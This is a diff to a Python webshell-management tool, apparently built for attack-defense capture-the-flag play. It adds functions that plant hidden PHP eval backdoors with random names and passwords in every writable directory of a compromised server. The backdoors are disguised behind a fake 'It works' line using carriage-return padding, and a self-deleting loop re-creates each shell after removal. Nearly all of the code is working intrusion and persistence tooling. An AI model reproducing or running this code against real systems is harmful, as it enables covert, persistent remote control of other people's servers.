@@ -22,6 +22,8 @@ class WebShell():
     php_version = ""
     kernel_version = ""
     disabled_functions = []
+    reason = ""
+    target_url = 0
     def __init__(self, url, method, password):
         self.url = url
         self.method = method
@@ -36,7 +38,10 @@ class WebShell():
             self.webroot = self.get_webroot()[1]
             self.php_version = self.get_php_version()
             self.kernel_version = self.get_kernel_version()
-            self.print_info()
+            # self.print_info()
+
+    def set_target_url(self, target_url):
+        self.target_url = target_url
 
     def php_code_exec(self, code):
         # TODO : 自己实现这个函数
@@ -54,7 +59,8 @@ class WebShell():
                 return (False, "Unsupported method!")
             content = response.text
             return (True, content)
-        except:
+        except Exception as e:
+            self.reason = repr(e)
             Log.error("The connection is aborted!")
             return (False, "The connection is aborted!")
 
@@ -115,7 +121,8 @@ class WebShell():
             Log.success("Content : \n%s" % (result[1]))
         else:
             Log.error("Error occured! %s" % result[1])
-
+        return result[1]
+        
     def get_writable_directory(self):
         command = "find %s -type d -writable" % (self.webroot)
         output = self.auto_exec(command)
@@ -137,9 +144,10 @@ class WebShell():
     def auto_inject_memery_webshell(self, filename, password):
         content = '<?php eval($_REQUEST["%s"]);?>' % (password)
         Log.info("Building webshell : %s" % (repr(content)))
-        self.auto_inject_memery_phpfile(filename, content)
+        return self.auto_inject_memery_phpfile(filename, content, password)
 
-    def auto_inject_memery_phpfile(self, filename, content):
+    def auto_inject_memery_phpfile(self, filename, content, password):
+        shells = []
         Log.info("Auto inject memery webshell...")
         webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $shell = '%s'; $fake = '<?php print_r(\"It works!\")?>'; $content = $shell.'\r'.$fake.str_repeat(' ', strlen($shell) - strlen($fake)).'\n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, content)
         Log.info("Code : [%s]" % (repr(webshell_content)))
@@ -147,10 +155,9 @@ class WebShell():
         writable_dirs = self.get_writable_directory()
         for writable_dir in writable_dirs:
             Log.info("-" * 32)
-            memery_webshell_filename = ".index.php"
             base_url = "%s%s/" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
-            url = base_url + memery_webshell_filename
-            path = "%s/%s" % (writable_dir, memery_webshell_filename)
+            url = base_url + filename
+            path = "%s/%s" % (writable_dir, filename)
             code = "if(file_put_contents('%s', base64_decode('%s'))){echo 'Success!';}else{echo 'Failed!';}" % (path, base64_encoded_webshell)
             code_exec_result = self.php_code_exec_token(code)[1]
             if ("Success!" in code_exec_result):
@@ -165,16 +172,28 @@ class WebShell():
                     error_content = str(e)
                     if "Read timed out" in error_content:
                         Log.success("Webshell actived! (%s)" % (error_content))
-                        webshell_url = "%s%s" % (base_url, filename)
-                        Log.info("Url : %s" % (webshell_url))
-                        Log.info("Content : %s" % (repr(content)))
-                        with open("Webshell.txt", "a+") as f:
-                            log_content = "%s => %s\n" % (webshell_url, repr(content))
-                            f.write(log_content)
+                        if writable_dir.startswith(self.webroot):
+                            url_path = writable_dir[len(self.webroot):]
+                        else:
+                            url_path = writable_dir
+                        shell = {
+                            "target_url":self.target_url,
+                            "path":url_path,
+                            "filename":filename,
+                            "password":password,
+                        }
+                        shells.append(shell)
+                        # webshell_url = "%s%s" % (base_url, filename)
+                        # Log.info("Url : %s" % (webshell_url))
+                        # Log.info("Content : %s" % (repr(content)))
+                        # with open("Webshell.txt", "a+") as f:
+                        #     log_content = "%s => %s\n" % (webshell_url, repr(content))
+                        #     f.write(log_content)
                     else:
                         Log.error("Error! Maybe the directory is not writable!")
             else:
                 Log.error("Error! Maybe the directory is not writable!")
+        return shells
 
     def get_suid_binaries(self):
         paths = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin', '/usr/games', '/usr/local/games', '/snap/bin']
@@ -241,11 +260,11 @@ class WebShell():
                 Log.error("Error occured! %s" % output[1])
 
     def check_working(self, url, method, auth):
-        Log.info("Checking whether the webshell is still work...")
+        # Log.info("Checking whether the webshell is still work...")
         flag = random_string(32, string.letters)
         token = random_string(32, string.letters)
-        Log.info("Using challenge flag : [%s]" % (flag))
-        Log.info("Using token : [%s]" % (token))
+        # Log.info("Using challenge flag : [%s]" % (flag))
+        # Log.info("Using token : [%s]" % (token))
         code = "echo '%s'; echo '%s'; echo '%s';" % (token, flag, token)
         result = self.php_code_exec(code)
         if result[0]:
@@ -253,6 +272,10 @@ class WebShell():
             for i in content.split(token):
                 if i == flag:
                     return True
+        if content != "":
+            self.reason = "Invalid password (%s) %s" % (self.password, content)
+        else:
+            self.reason = "Invalid password (%s)" % (self.password)
         return False
         '''
         method = string.upper(method)
@@ -283,7 +306,8 @@ class WebShell():
             else:
                 Log.success("The status code is %d" % (response.status_code))
             return True
-        except:
+        except Exception as e:
+            self.reason = repr(e)
             Log.error("Connection error!")
             return False
 
@@ -586,6 +610,44 @@ class WebShell():
         urls = self.auto_inject_phpfile(filename, content)
         Log.success("Inject success : \n%s" % (urls))
 
+    def auto_inject_random_phpfile(self):
+        writable_dirs = self.get_writable_directory()
+        shells = []
+        if len(writable_dirs) == 0:
+            Log.error("No writable dirs...")
+            return False
+        else:
+            for writable_dir in writable_dirs:
+                writable_dir += "/"
+
+                filename = ".%s.php" % (random_string(16, string.letters + string.digits))
+                password = (random_string(16, string.letters + string.digits))
+                
+                webshell_content = "<?php eval($_REQUEST['%s']);?>" % (password)
+                fake_content = "<?php print_r('It works');?>"
+                padding = " " * (len(webshell_content) - len(fake_content))
+                content = webshell_content + "\r" + fake_content + padding + "\n"
+
+                php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), content.encode("base64").replace("\n",""))
+                self.php_code_exec(php_code)
+
+                
+                if writable_dir.startswith(self.webroot):
+                    path = writable_dir[len(self.webroot):]
+                else:
+                    path = writable_dir
+                shell = {
+                    "target_url":self.target_url,
+                    "path":path,
+                    "filename":filename,
+                    "password":password,
+                }
+
+                shells.append(shell)
+                # base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s" % (self.webroot), ""))
+                # webshell_url = ("%s%s" % (base_url, filename)).replace("//", "/").replace("https:/", "https://").replace("http:/", "http://")
+        return shells
+
     def auto_inject_flag_reaper(self, filename, content):
         # TODO : remove arg filename
         urls = self.auto_inject_phpfile(filename, content)
@@ -613,6 +675,9 @@ class WebShell():
             Log.error("All failed!")
             return False
 
+    def self_remove(self):
+        return self.php_code_exec_token("print_r(__FILE__);var_dump(unlink(__FILE__));")
+
     def auto_inject_phpfile(self, filename, webshell_content):
         Log.info("Auto injecting : [%s] => [%s]" % (filename, repr(webshell_content)))
         Log.info("Code : [%s]" % (repr(webshell_content)))
@@ -637,6 +702,8 @@ class WebShell():
                     f.write(log_content)
                 urls.append(webshell_url)
         return urls
+
+
 
     def save(self, filename):
         webshell_config = json.load(open(filename, "a+"))
